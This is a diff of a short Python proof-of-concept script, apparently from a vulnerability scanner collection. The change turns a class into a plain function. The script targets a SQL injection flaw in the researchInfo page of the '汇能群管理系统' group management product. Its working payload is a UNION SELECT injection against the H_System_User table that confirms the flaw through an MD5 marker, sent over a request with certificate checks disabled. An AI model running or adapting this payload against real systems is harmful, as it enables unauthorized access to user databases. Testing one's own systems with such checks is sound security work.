@@ -9,17 +9,10 @@ description: 链接/main/model/childcatalog/researchinfo_dan.jsp?researchId=1中
 import sys
 import requests
 import warnings
-
-  
-
-class hnkj_researchinfo_dan_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['汇能群管理系统SQL注入','','']
         payload = "/main/model/childcatalog/researchinfo_dan.jsp?researchId=-1%20union%20select%201,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),3%20from%20H_System_User--"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,4 @@ class hnkj_researchinfo_dan_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = hnkj_researchinfo_dan_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
